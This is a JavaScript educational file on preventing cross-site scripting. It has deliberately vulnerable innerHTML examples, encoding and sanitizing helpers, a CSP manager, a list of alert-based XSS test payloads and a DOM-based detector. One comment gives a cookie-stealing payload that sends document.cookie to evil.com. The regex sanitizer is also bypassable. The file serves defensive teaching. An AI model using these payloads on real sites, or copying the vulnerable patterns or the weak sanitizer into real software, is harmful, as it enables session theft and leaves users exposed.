/**
 * XSS Prevention JavaScript Implementation
 * Transformed from PHP examples for playcode.io execution
 * 
 * This file contains comprehensive XSS prevention techniques
 * including vulnerable examples, secure implementations, and testing frameworks.
 */

// ============================================================================
// 1. VULNERABLE CODE EXAMPLES (FOR EDUCATIONAL PURPOSES ONLY)
// ============================================================================

console.log('=== XSS Prevention JavaScript Implementation ===\n');

// VULNERABLE: Basic HTML output without sanitization
function vulnerableHTMLOutput(userInput) {
    // VULNERABLE CODE - NEVER USE IN PRODUCTION
    // This simulates the PHP: echo "Welcome " . $username . "!";
    
    const welcomeDiv = document.createElement('div');
    welcomeDiv.innerHTML = `Welcome ${userInput}!`;
    
    // Attack Vectors that would execute:
    // <script>alert('XSS')</script>
    // <img src=x onerror="alert('XSS')">
    
    return welcomeDiv;
}

// VULNERABLE: JavaScript DOM manipulation
function vulnerableDOMManipulation(comment) {
    // VULNERABLE CODE
    const commentDisplay = document.getElementById('vulnerable-comment-display');
    if (commentDisplay) {
        commentDisplay.innerHTML = comment;
    }
    
    // Attack Vector: <img src=x onerror="document.location='http://evil.com/steal.php?cookie='+document.cookie">
}

// VULNERABLE: Direct property assignment
function vulnerablePropertyAssignment(data) {
    // VULNERABLE: Direct assignment to innerHTML
    document.body.innerHTML = data.htmlContent;
    
    // VULNERABLE: Direct assignment to attributes
    document.getElementById('user-link').href = data.url;
}

// ============================================================================
// 2. SECURE OUTPUT ENCODING TECHNIQUES
// ============================================================================

/**
 * XSS Protection and Output Encoding Class
 * Implements secure encoding for different contexts
 */
class XSSProtector {
    /**
     * HTML entity encoding - safest for HTML content
     */
    static encodeHTML(text) {
        if (text === null || text === undefined) {
            return '';
        }
        
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    /**
     * Attribute encoding - for HTML attributes
     */
    static encodeAttr(attr) {
        if (attr === null || attr === undefined) {
            return '';
        }
        
        const div = document.createElement('div');
        div.setAttribute('data-temp', attr);
        return div.getAttribute('data-temp');
    }
    
    /**
     * JavaScript string encoding - for embedding in JS strings
     */
    static encodeJavaScript(str) {
        if (str === null || str === undefined) {
            return '';
        }
        
        return JSON.stringify(str, function(key, val) {
            if (typeof val === 'string') {
                return val
                    .replace(/\\/g, '\\\\')     // Escape backslashes first
                    .replace(/</g, '\\x3C')     // Replace < to prevent tag breaking
                    .replace(/>/g, '\\x3E')     // Replace > to prevent tag breaking
                    .replace(/"/g, '\\x22')     // Escape quotes
                    .replace(/'/g, "\\x27");    // Escape single quotes
            }
            return val;
        });
    }
    
    /**
     * URL encoding - for URLs
     */
    static encodeURL(input) {
        if (input === null || input === undefined) {
            return '';
        }
        
        return encodeURIComponent(input);
    }
    
    /**
     * Create safe text node - safest method for text content
     */
    static safeTextNode(text) {
        const textNode = document.createTextNode(text);
        return textNode;
    }
    
    /**
     * Safe HTML rendering with controlled tags only
     */
    static safeHTML(cleanHTML) {
        const div = document.createElement('div');
        div.innerHTML = cleanHTML;
        
        // Return the first child if it's a single element, otherwise return text content
        const children = div.childNodes;
        if (children.length === 1 && children[0].nodeType === Node.ELEMENT_NODE) {
            return children[0];
        }
        return div.innerHTML;
    }
}

// ============================================================================
// 3. DOM-BASED XSS PREVENTION
// ============================================================================

/**
 * Safe DOM Manipulation Functions
 */
class SafeDOMHandler {
    
    /**
     * Display user comment securely using text nodes
     */
    static displayUserCommentSecure(comment) {
        const commentDiv = document.getElementById('secure-comment-display');
        
        if (!commentDiv) {
            console.error('Comment display element not found');
            return;
        }
        
        // Clear existing content
        commentDiv.innerHTML = '';
        
        // Create safe text node - prevents all XSS
        const textNode = XSSProtector.safeTextNode(comment);
        commentDiv.appendChild(textNode);
    }
    
    /**
     * Controlled HTML rendering with allowed tags only
     */
    static displayCommentControlled(htmlContent) {
        const allowedTags = ['<p>', '<br>', '<strong>', '<em>', '<u>', '<code>', '<b>', '<i>'];
        const allowedAttributes = ['class'];
        
        const parser = new DOMParser();
        const doc = parser.parseFromString(`<div>${htmlContent}</div>`, 'text/html');
        
        // Filter allowed elements
        const walk = (node) => {
            const children = Array.from(node.childNodes);
            for (const child of children) {
                if (child.nodeType === Node.ELEMENT_NODE) {
                    const tagName = child.tagName.toLowerCase();
                    
                    // Remove disallowed tags
                    if (!allowedTags.includes(`<${tagName}>`)) {
                        child.replaceWith(...child.childNodes);
                        continue;
                    }
                    
                    // Remove disallowed attributes
                    const attrs = Array.from(child.attributes);
                    for (const attr of attrs) {
                        if (!allowedAttributes.includes(attr.name)) {
                            child.removeAttribute(attr.name);
                        }
                        
                        // Remove dangerous attribute values
                        if (attr.name.startsWith('on')) {
                            child.removeAttribute(attr.name);
                        }
                    }
                    
                    // Recursively process children
                    walk(child);
                } else if (child.nodeType === Node.TEXT_NODE) {
                    // Text nodes are safe
                    continue;
                } else {
                    // Remove other node types (comments, etc.)
                    child.remove();
                }
            }
        };
        
        walk(doc.body);
        
        return doc.body.firstChild ? doc.body.firstChild.innerHTML : '';
    }
    
    /**
     * Safe property assignment
     */
    static safeAssignProperty(elementId, property, value) {
        const element = document.getElementById(elementId);
        if (!element) {
            console.error(`Element with id '${elementId}' not found`);
            return;
        }
        
        switch (property) {
            case 'textContent':
                element.textContent = value; // Safe
                break;
            case 'innerHTML':
                // Only allow if content is pre-sanitized
                element.innerHTML = this.displayCommentControlled(value);
                break;
            case 'href':
            case 'src':
                // Validate URLs
                if (this.isSafeURL(value)) {
                    element.setAttribute(property, value);
                } else {
                    console.warn(`Blocked unsafe URL: ${value}`);
                }
                break;
            default:
                // Use setAttribute for other properties
                element.setAttribute(property, XSSProtector.encodeAttr(value));
        }
    }
    
    /**
     * Check if URL is safe for assignment
     */
    static isSafeURL(url) {
        try {
            const urlObj = new URL(url);
            const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
            return allowedProtocols.includes(urlObj.protocol);
        } catch {
            return false;
        }
    }
}

// ============================================================================
// 4. URL HANDLING SECURITY
// ============================================================================

/**
 * Safe URL Handler for validation and secure link creation
 */
class SafeURLHandler {
    
    /**
     * Parse and validate URL
     */
    static parseAndValidateURL(urlString) {
        try {
            const url = new URL(urlString);
            
            // Only allow certain protocols
            const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
            if (!allowedProtocols.includes(url.protocol)) {
                throw new Error(`Disallowed protocol: ${url.protocol}`);
            }
            
            // For http/https, validate domain
            if (['http:', 'https:'].includes(url.protocol)) {
                if (!this.isValidDomain(url.hostname)) {
                    throw new Error(`Invalid domain: ${url.hostname}`);
                }
            }
            
            return url;
        } catch (error) {
            throw new Error(`Invalid URL: ${error.message}`);
        }
    }
    
    /**
     * Basic domain validation
     */
    static isValidDomain(domain) {
        const domainRegex = /^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$/;
        return domainRegex.test(domain) && domain.length <= 253;
    }
    
    /**
     * Create safe link element
     */
    static createSafeLink(urlString, text) {
        try {
            const url = this.parseAndValidateURL(urlString);
            const link = document.createElement('a');
            link.href = url.toString();
            link.textContent = text;
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            return link;
        } catch (error) {
            console.warn('Invalid URL:', error.message);
            const span = document.createElement('span');
            span.textContent = text;
            return span;
        }
    }
    
    /**
     * Safe redirect with domain whitelist
     */
    static safeRedirect(urlString) {
        try {
            const url = this.parseAndValidateURL(urlString);
            
            // Additional check: only allow same-domain redirects unless explicitly whitelisted
            const allowedDomains = [
                window.location.hostname,
                'trusted-partner.com',
                'api.example.com'
            ];
            
            if (!allowedDomains.includes(url.hostname)) {
                throw new Error(`Redirect to untrusted domain: ${url.hostname}`);
            }
            
            window.location.href = url.toString();
        } catch (error) {
            console.error('Blocked redirect:', error.message);
            // Redirect to safe default or show error
            window.location.href = '/';
        }
    }
}

// ============================================================================
// 5. INPUT SANITIZATION AND VALIDATION
// ============================================================================

/**
 * Input Sanitization and Validation Class
 */
class InputValidator {
    
    /**
     * Whitelist validation for usernames
     */
    static validateUsername(input) {
        if (!input || typeof input !== 'string') {
            return false;
        }
        
        // Allow only alphanumeric and underscore, 3-20 characters
        const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
        return usernameRegex.test(input);
    }
    
    /**
     * Validate email format
     */
    static validateEmail(input) {
        if (!input || typeof input !== 'string') {
            return false;
        }
        
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(input);
    }
    
    /**
     * Basic input length validation
     */
    static validateLength(input, min = 0, max = 1000) {
        if (!input || typeof input !== 'string') {
            return input === '' && min === 0;
        }
        
        return input.length >= min && input.length <= max;
    }
    
    /**
     * Remove potentially dangerous characters
     */
    static sanitizeInput(input) {
        if (!input || typeof input !== 'string') {
            return '';
        }
        
        return input
            .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '') // Remove script tags
            .replace(/<[^>]*>/g, '') // Remove HTML tags
            .replace(/javascript:/gi, '') // Remove javascript: protocol
            .replace(/on\w+="[^"]*"/gi, '') // Remove event handlers
            .replace(/on\w+='[^']*'/gi, ''); // Remove event handlers with single quotes
    }
    
    /**
     * Sanitize HTML allowing only safe tags
     */
    static sanitizeHTML(input, allowedTags = []) {
        if (!input || typeof input !== 'string') {
            return '';
        }
        
        if (allowedTags.length === 0) {
            // If no tags specified, strip all HTML
            return this.sanitizeInput(input);
        }
        
        // Create a temporary div to parse HTML
        const temp = document.createElement('div');
        temp.textContent = input;
        
        // This is a simplified version - in production, use a proper HTML sanitizer
        return temp.innerHTML;
    }
}

// ============================================================================
// 6. CONTENT SECURITY POLICY (CSP) IMPLEMENTATION
// ============================================================================

/**
 * CSP Manager for browser-side CSP implementation
 */
class CSPManager {
    
    static policies = {
        'default': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https:; connect-src 'self';",
        'strict': "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';",
        'relaxed': "default-src 'self' *.cdn.example.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' *.analytics.com; style-src 'self' 'unsafe-inline' *.cdn.example.com; img-src 'self' data: https:;",
        'api': "default-src 'none'; script-src 'self'; style-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none';"
    };
    
    /**
     * Apply CSP via meta tag (fallback when HTTP headers can't be set)
     */
    static applyMetaCSP(policy = 'default') {
        const policyText = this.policies[policy];
        if (!policyText) {
            console.error(`Unknown CSP policy: ${policy}`);
            return;
        }
        
        const meta = document.createElement('meta');
        meta.httpEquiv = 'Content-Security-Policy';
        meta.content = policyText;
        document.head.appendChild(meta);
        
        console.log(`Applied CSP policy: ${policy}`);
    }
    
    /**
     * Generate cryptographically secure nonce
     */
    static generateNonce() {
        const array = new Uint8Array(16);
        crypto.getRandomValues(array);
        return btoa(String.fromCharCode(...array));
    }
    
    /**
     * Create script element with nonce
     */
    static createNonceScript(content, nonce) {
        const script = document.createElement('script');
        script.nonce = nonce;
        script.textContent = content;
        return script;
    }
    
    /**
     * Monitor CSP violations
     */
    static setupCSPMonitoring() {
        document.addEventListener('securitypolicyviolation', (event) => {
            console.warn('CSP Violation Detected:', {
                blockedURI: event.blockedURI,
                violatedDirective: event.violatedDirective,
                documentURI: event.documentURI,
                lineNumber: event.lineNumber,
                columnNumber: event.columnNumber
            });
            
            // Send to monitoring system (simulated)
            this.reportCSPViolation({
                type: 'csp',
                blockedURI: event.blockedURI,
                violatedDirective: event.violatedDirective,
                documentURI: event.documentURI,
                timestamp: new Date().toISOString()
            });
        });
    }
    
    /**
     * Report CSP violation (simulated)
     */
    static async reportCSPViolation(violation) {
        try {
            // In a real application, this would send to your monitoring endpoint
            console.log('CSP Violation Report:', violation);
            
            // Simulate API call
            // await fetch('/api/csp-report', {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify(violation)
            // });
        } catch (error) {
            console.error('Failed to send CSP violation report:', error);
        }
    }
}

// ============================================================================
// 7. COOKIE AND SESSION SECURITY
// ============================================================================

/**
 * Secure Cookie Manager
 */
class SecureCookieManager {
    
    /**
     * Set secure cookie with appropriate flags
     */
    static setCookie(name, value, days = 30) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
        
        // Note: JavaScript cannot set HttpOnly or Secure flags directly
        // These must be set by the server
        document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }
    
    /**
     * Get cookie value
     */
    static getCookie(name) {
        const nameEQ = name + "=";
        const cookies = document.cookie.split(';');
        
        for (let cookie of cookies) {
            cookie = cookie.trim();
            if (cookie.indexOf(nameEQ) === 0) {
                return cookie.substring(nameEQ.length);
            }
        }
        return null;
    }
    
    /**
     * Delete cookie
     */
    static deleteCookie(name) {
        document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/;SameSite=Strict`;
    }
    
    /**
     * Validate if cookie can be set securely
     */
    static validateCookieSetting() {
        // Check if we're in a secure context (HTTPS)
        if (location.protocol !== 'https:') {
            console.warn('Secure cookies require HTTPS');
            return false;
        }
        
        // Check if we're in a secure context
        if (!window.isSecureContext) {
            console.warn('This context is not secure');
            return false;
        }
        
        return true;
    }
}

// ============================================================================
// 8. XSS TESTING AND VALIDATION FRAMEWORK
// ============================================================================

/**
 * XSS Testing Suite for validation
 */
class XSSTester {
    constructor() {
        this.testPayloads = [
            {
                name: 'Basic Script Tag',
                payload: '<script>alert("XSS")</script>',
                type: 'stored',
                severity: 'high'
            },
            {
                name: 'Image onError',
                payload: '<img src="x" onerror="alert(\'XSS\')">',
                type: 'stored',
                severity: 'high'
            },
            {
                name: 'JavaScript Protocol',
                payload: '<a href="javascript:alert(\'XSS\')">Click</a>',
                type: 'reflected',
                severity: 'high'
            },
            {
                name: 'Inline Event Handler',
                payload: '<div onmouseover="alert(\'XSS\')">Hover</div>',
                type: 'stored',
                severity: 'medium'
            },
            {
                name: 'SVG Script',
                payload: '<svg onload="alert(\'XSS\')">',
                type: 'stored',
                severity: 'high'
            },
            {
                name: 'BASE64 Encoded',
                payload: '<script>PGNvZGU+YWxlcnQoIlhTUyIpPC9zY3JpcHQ+</script>',
                type: 'reflected',
                severity: 'medium'
            },
            {
                name: 'Nested Tags',
                payload: '<div><script>alert("XSS")</script></div>',
                type: 'stored',
                severity: 'high'
            },
            {
                name: 'Data URI',
                payload: '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSI+">',
                type: 'stored',
                severity: 'medium'
            }
        ];
    }
    
    /**
     * Test input validation against malicious payloads
     */
    testInputValidation(input, validationFunction) {
        return this.testPayloads.map(payload => {
            try {
                const result = validationFunction(payload.payload);
                return {
                    payload: payload.name,
                    original: payload.payload,
                    sanitized: result,
                    allowed: result !== payload.payload,
                    vulnerable: result === payload.payload,
                    type: payload.type,
                    severity: payload.severity
                };
            } catch (error) {
                return {
                    payload: payload.name,
                    original: payload.payload,
                    sanitized: null,
                    allowed: false,
                    vulnerable: false,
                    type: payload.type,
                    severity: payload.severity,
                    error: error.message
                };
            }
        });
    }
    
    /**
     * Test DOM manipulation for XSS
     */
    testDOMManipulation(testElement, payload) {
        const results = {
            element: testElement.id || 'unnamed',
            payload: payload,
            vulnerabilities: []
        };
        
        // Test innerHTML
        try {
            testElement.innerHTML = payload;
            if (testElement.innerHTML === payload) {
                results.vulnerabilities.push({
                    method: 'innerHTML',
                    vulnerable: true,
                    note: 'Payload was not sanitized'
                });
            } else {
                results.vulnerabilities.push({
                    method: 'innerHTML',
                    vulnerable: false,
                    note: 'Content was sanitized/modified'
                });
            }
        } catch (error) {
            results.vulnerabilities.push({
                method: 'innerHTML',
                vulnerable: false,
                error: error.message
            });
        }
        
        return results;
    }
    
    /**
     * Generate comprehensive test report
     */
    generateTestReport(results) {
        let report = 'XSS Protection Test Results\n';
        report += '=============================\n\n';
        
        const vulnerable = results.filter(r => r.vulnerable).length;
        const blocked = results.filter(r => !r.vulnerable && !r.error).length;
        const errors = results.filter(r => r.error).length;
        
        report += `Total Tests: ${results.length}\n`;
        report += `Vulnerable: ${vulnerable}\n`;
        report += `Blocked: ${blocked}\n`;
        report += `Errors: ${errors}\n`;
        report += `Security Score: ${Math.round((blocked / results.length) * 100)}%\n\n`;
        
        // Severity breakdown
        const severityCounts = { high: 0, medium: 0, low: 0 };
        results.forEach(r => {
            if (r.severity) severityCounts[r.severity]++;
        });
        
        report += `Payload Types:\n`;
        report += `  High Severity: ${severityCounts.high}\n`;
        report += `  Medium Severity: ${severityCounts.medium}\n`;
        report += `  Low Severity: ${severityCounts.low}\n\n`;
        
        results.forEach(result => {
            const status = result.vulnerable ? 'VULNERABLE' : 
                          result.error ? 'ERROR' : 'BLOCKED';
            const severity = result.severity ? ` [${result.severity.toUpperCase()}]` : '';
            
            report += `[${status}] ${result.payload}${severity}\n`;
            
            if (result.original && result.sanitized) {
                report += `  Original: ${result.original}\n`;
                report += `  Result:   ${result.sanitized}\n`;
            }
            
            if (result.error) {
                report += `  Error: ${result.error}\n`;
            }
            report += '\n';
        });
        
        // Security recommendations
        report += 'Security Recommendations:\n';
        report += '------------------------\n';
        if (vulnerable > 0) {
            report += '• IMMEDIATE ACTION REQUIRED: Vulnerabilities detected!\n';
            report += '• Implement output encoding for all user data\n';
            report += '• Add Content Security Policy headers\n';
            report += '• Use sanitization libraries (DOMPurify)\n';
        } else {
            report += '✓ No vulnerabilities detected in basic tests\n';
            report += '• Continue with comprehensive testing\n';
            report += '• Implement defense-in-depth strategies\n';
        }
        
        return report;
    }
}

// ============================================================================
// 9. XSS DETECTION AND MONITORING
// ============================================================================

/**
 * XSS Detection and Monitoring System
 */
class XSSDetector {
    constructor() {
        this.violations = [];
        this.isMonitoring = false;
        this.setupCSPMonitoring();
        this.setupDOMMonitoring();
    }
    
    /**
     * Enable CSP violation monitoring
     */
    setupCSPMonitoring() {
        document.addEventListener('securitypolicyviolation', (event) => {
            this.recordViolation({
                type: 'csp',
                blockedURI: event.blockedURI,
                violatedDirective: event.violatedDirective,
                documentURI: event.documentURI,
                lineNumber: event.lineNumber,
                columnNumber: event.columnNumber,
                timestamp: new Date().toISOString()
            });
        });
    }
    
    /**
     * Enable DOM mutation monitoring
     */
    setupDOMMonitoring() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        this.checkElementForXSS(node);
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
    
    /**
     * Check element for potential XSS
     */
    checkElementForXSS(element) {
        // Check for dangerous attributes
        const dangerousAttributes = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur'];
        dangerousAttributes.forEach(attr => {
            if (element.hasAttribute(attr)) {
                this.recordViolation({
                    type: 'dom',
                    element: element.tagName.toLowerCase(),
                    attribute: attr,
                    value: element.getAttribute(attr),
                    timestamp: new Date().toISOString()
                });
            }
        });
        
        // Check for script tags
        if (element.tagName.toLowerCase() === 'script') {
            this.recordViolation({
                type: 'dom',
                element: 'script',
                src: element.src || 'inline',
                timestamp: new Date().toISOString()
            });
        }
        
        // Check for dangerous elements
        const dangerousTags = ['iframe', 'object', 'embed', 'applet', 'frame'];
        if (dangerousTags.includes(element.tagName.toLowerCase())) {
            this.recordViolation({
                type: 'dom',
                element: element.tagName.toLowerCase(),
                timestamp: new Date().toISOString()
            });
        }
        
        // Check href for javascript: protocol
        if (element.hasAttribute('href')) {
            const href = element.getAttribute('href');
            if (href && href.toLowerCase().startsWith('javascript:')) {
                this.recordViolation({
                    type: 'protocol',
                    element: element.tagName.toLowerCase(),
                    attribute: 'href',
                    value: href,
                    timestamp: new Date().toISOString()
                });
            }
        }
    }
    
    /**
     * Record detected violation
     */
    recordViolation(violation) {
        this.violations.push(violation);
        
        // Send to monitoring system
        this.sendViolationReport(violation);
        
        // Log for development
        console.warn('XSS Attempt Detected:', violation);
        
        // Notify user in demo mode
        if (this.isDemoMode) {
            this.showViolationAlert(violation);
        }
    }
    
    /**
     * Send violation report (simulated)
     */
    async sendViolationReport(violation) {
        try {
            // In production, this would send to your monitoring endpoint
            console.log('Violation Report:', violation);
            
            // Simulate API call
            // await fetch('/api/xss-violation', {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify(violation)
            // });
        } catch (error) {
            console.error('Failed to send violation report:', error);
        }
    }
    
    /**
     * Show violation alert in demo mode
     */
    showViolationAlert(violation) {
        const alertDiv = document.createElement('div');
        alertDiv.style.cssText = `
            position: fixed; top: 10px; right: 10px; z-index: 10000;
            background: #ff4444; color: white; padding: 10px;
            border-radius: 5px; font-family: monospace; font-size: 12px;
            max-width: 300px; word-wrap: break-word;
        `;
        alertDiv.textContent = `XSS Detected: ${violation.type} - ${violation.element || violation.violatedDirective}`;
        
        document.body.appendChild(alertDiv);
        
        setTimeout(() => {
            if (alertDiv.parentNode) {
                alertDiv.parentNode.removeChild(alertDiv);
            }
        }, 5000);
    }
    
    /**
     * Enable demo mode with visual alerts
     */
    enableDemoMode() {
        this.isDemoMode = true;
        this.isMonitoring = true;
        console.log('XSS Detection Demo Mode Enabled');
    }
    
    /**
     * Disable monitoring
     */
    disableMonitoring() {
        this.isMonitoring = false;
        console.log('XSS Detection Disabled');
    }
    
    /**
     * Get detection report
     */
    getReport() {
        return {
            totalViolations: this.violations.length,
            violations: this.violations,
            summary: this.generateSummary(),
            isMonitoring: this.isMonitoring
        };
    }
    
    /**
     * Generate violation summary
     */
    generateSummary() {
        const types = {};
        const elements = {};
        
        this.violations.forEach(v => {
            types[v.type] = (types[v.type] || 0) + 1;
            if (v.element) {
                elements[v.element] = (elements[v.element] || 0) + 1;
            }
        });
        
        return {
            violationTypes: types,
            targetedElements: elements,
            mostRecent: this.violations[this.violations.length - 1],
            firstViolation: this.violations[0]
        };
    }
}

// ============================================================================
// 10. INTERACTIVE DEMONSTRATION FUNCTIONS
// ============================================================================

/**
 * Interactive XSS Prevention Demo
 */
class XSSDemo {
    constructor() {
        this.tester = new XSSTester();
        this.detector = new XSSDetector();
        this.setupDemoElements();
    }
    
    /**
     * Setup demo HTML elements
     */
    setupDemoElements() {
        // Create demo container
        const demoContainer = document.createElement('div');
        demoContainer.id = 'xss-demo-container';
        demoContainer.innerHTML = `
            <div style="border: 2px solid #333; padding: 20px; margin: 20px 0; background: #f5f5f5;">
                <h2 style="margin-top: 0;">XSS Prevention Demo</h2>
                
                <!-- Vulnerable Examples -->
                <div style="margin: 20px 0; padding: 15px; border: 1px solid #ff4444; background: #ffe6e6;">
                    <h3 style="color: #ff4444;">❌ Vulnerable Examples</h3>
                    
                    <div>
                        <label>Username Input (Vulnerable):</label>
                        <input type="text" id="vulnerable-input" placeholder="Enter username" style="width: 300px; margin: 5px;">
                        <button onclick="demo.testVulnerableOutput()" style="margin: 5px;">Test</button>
                        <div id="vulnerable-output" style="margin: 10px 0; padding: 10px; background: white; border: 1px solid #ccc; min-height: 30px;"></div>
                    </div>
                    
                    <div>
                        <label>Comment Input (Vulnerable DOM):</label>
                        <input type="text" id="vulnerable-comment" placeholder="Enter comment" style="width: 300px; margin: 5px;">
                        <button onclick="demo.testVulnerableDOM()" style="margin: 5px;">Test</button>
                        <div id="vulnerable-comment-display" style="margin: 10px 0; padding: 10px; background: white; border: 1px solid #ccc; min-height: 30px;"></div>
                    </div>
                </div>
                
                <!-- Secure Examples -->
                <div style="margin: 20px 0; padding: 15px; border: 1px solid #44ff44; background: #e6ffe6;">
                    <h3 style="color: #44aa44;">✅ Secure Examples</h3>
                    
                    <div>
                        <label>Username Input (Secure):</label>
                        <input type="text" id="secure-input" placeholder="Enter username" style="width: 300px; margin: 5px;">
                        <button onclick="demo.testSecureOutput()" style="margin: 5px;">Test</button>
                        <div id="secure-output" style="margin: 10px 0; padding: 10px; background: white; border: 1px solid #ccc; min-height: 30px;"></div>
                    </div>
                    
                    <div>
                        <label>Comment Input (Secure DOM):</label>
                        <input type="text" id="secure-comment" placeholder="Enter comment" style="width: 300px; margin: 5px;">
                        <button onclick="demo.testSecureDOM()" style="margin: 5px;">Test</button>
                        <div id="secure-comment-display" style="margin: 10px 0; padding: 10px; background: white; border: 1px solid #ccc; min-height: 30px;"></div>
                    </div>
                </div>
                
                <!-- Test Controls -->
                <div style="margin: 20px 0; padding: 15px; border: 1px solid #4444ff; background: #e6e6ff;">
                    <h3 style="color: #4444aa;">🧪 Security Testing</h3>
                    
                    <button onclick="demo.runSecurityTests()" style="margin: 5px; padding: 10px; background: #4444ff; color: white; border: none; border-radius: 3px;">Run XSS Security Tests</button>
                    <button onclick="demo.enableDetection()" style="margin: 5px; padding: 10px; background: #ff8800; color: white; border: none; border-radius: 3px;">Enable XSS Detection</button>
                    <button onclick="demo.applyCSP()" style="margin: 5px; padding: 10px; background: #008800; color: white; border: none; border-radius: 3px;">Apply CSP</button>
                    
                    <div id="test-results" style="margin: 15px 0; padding: 15px; background: white; border: 1px solid #ccc; font-family: monospace; white-space: pre-wrap; max-height: 300px; overflow-y: auto; display: none;"></div>
                </div>
                
                <!-- Quick Test Buttons -->
                <div style="margin: 20px 0;">
                    <h4>Quick XSS Payload Tests:</h4>
                    <button onclick="demo.testPayload('<script>alert(\\'XSS\\')</script>')" style="margin: 2px; padding: 5px; font-size: 12px;">Script Tag</button>
                    <button onclick="demo.testPayload('<img src=x onerror=\\'alert(\\"XSS\\")\\'>')" style="margin: 2px; padding: 5px; font-size: 12px;">Image Error</button>
                    <button onclick="demo.testPayload('<a href=\\'javascript:alert(\\"XSS\\")\\'>Click</a>')" style="margin: 2px; padding: 5px; font-size: 12px;">JS Protocol</button>
                    <button onclick="demo.testPayload('<div onmouseover=\\'alert(\\"XSS\\")\\'>Hover</div>')" style="margin: 2px; padding: 5px; font-size: 12px;">Event Handler</button>
                </div>
            </div>
        `;
        
        document.body.appendChild(demoContainer);
    }
    
    /**
     * Test vulnerable HTML output
     */
    testVulnerableOutput() {
        const input = document.getElementById('vulnerable-input').value;
        const output = document.getElementById('vulnerable-output');
        
        // VULNERABLE: Direct innerHTML assignment
        output.innerHTML = `Welcome ${input}!`;
        
        console.log('Vulnerable output test:', input);
    }
    
    /**
     * Test vulnerable DOM manipulation
     */
    testVulnerableDOM() {
        const input = document.getElementById('vulnerable-comment').value;
        
        // VULNERABLE: Direct innerHTML assignment
        const commentDisplay = document.getElementById('vulnerable-comment-display');
        commentDisplay.innerHTML = input;
        
        console.log('Vulnerable DOM test:', input);
    }
    
    /**
     * Test secure HTML output
     */
    testSecureOutput() {
        const input = document.getElementById('secure-input').value;
        const output = document.getElementById('secure-output');
        
        // SECURE: HTML encoding
        const safeInput = XSSProtector.encodeHTML(input);
        output.textContent = `Welcome ${safeInput}!`;
        
        console.log('Secure output test:', input, '->', safeInput);
    }
    
    /**
     * Test secure DOM manipulation
     */
    testSecureDOM() {
        const input = document.getElementById('secure-comment').value;
        
        // SECURE: Using safe DOM methods
        SafeDOMHandler.displayUserCommentSecure(input);
        
        console.log('Secure DOM test:', input);
    }
    
    /**
     * Test XSS payload
     */
    testPayload(payload) {
        console.log('Testing payload:', payload);
        
        // Test in vulnerable section
        document.getElementById('vulnerable-input').value = payload;
        this.testVulnerableOutput();
        
        // Test in secure section
        document.getElementById('secure-input').value = payload;
        this.testSecureOutput();
    }
    
    /**
     * Run comprehensive security tests
     */
    runSecurityTests() {
        const testResultsDiv = document.getElementById('test-results');
        testResultsDiv.style.display = 'block';
        
        // Test input validation
        const validationResults = this.tester.testInputValidation('', (input) => {
            return XSSProtector.encodeHTML(input);
        });
        
        // Generate report
        const report = this.tester.generateTestReport(validationResults);
        testResultsDiv.textContent = report;
        
        console.log('Security tests completed');
    }
    
    /**
     * Enable XSS detection
     */
    enableDetection() {
        this.detector.enableDemoMode();
        console.log('XSS Detection enabled with visual alerts');
    }
    
    /**
     * Apply CSP
     */
    applyCSP() {
        CSPManager.applyMetaCSP('strict');
        console.log('Content Security Policy applied');
    }
}

// ============================================================================
// 11. INITIALIZATION AND EXPORTS
// ============================================================================

// Initialize demo when DOM is loaded
let demo;

document.addEventListener('DOMContentLoaded', function() {
    console.log('XSS Prevention Framework Loaded');
    
    // Initialize CSP monitoring
    CSPManager.setupCSPMonitoring();
    
    // Initialize demo
    demo = new XSSDemo();
    
    // Log framework status
    console.log('✅ XSS Protection Classes:');
    console.log('  - XSSProtector: Output encoding');
    console.log('  - SafeDOMHandler: Safe DOM manipulation');
    console.log('  - SafeURLHandler: URL validation');
    console.log('  - InputValidator: Input sanitization');
    console.log('  - CSPManager: Content Security Policy');
    console.log('  - XSSTester: Security testing');
    console.log('  - XSSDetector: Real-time monitoring');
    
    // Display usage examples
    console.log('\n📚 Usage Examples:');
    console.log('// Secure HTML encoding');
    console.log('const safe = XSSProtector.encodeHTML(userInput);');
    console.log('element.textContent = safe;');
    console.log('');
    console.log('// Safe DOM manipulation');
    console.log('SafeDOMHandler.displayUserCommentSecure(userComment);');
    console.log('');
    console.log('// URL validation');
    console.log('const safeLink = SafeURLHandler.createSafeLink(url, text);');
    console.log('');
    console.log('// Apply CSP');
    console.log('CSPManager.applyMetaCSP("strict");');
});

// Export classes for use in other scripts
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        XSSProtector,
        SafeDOMHandler,
        SafeURLHandler,
        InputValidator,
        CSPManager,
        SecureCookieManager,
        XSSTester,
        XSSDetector,
        XSSDemo
    };
}

// Make classes globally available
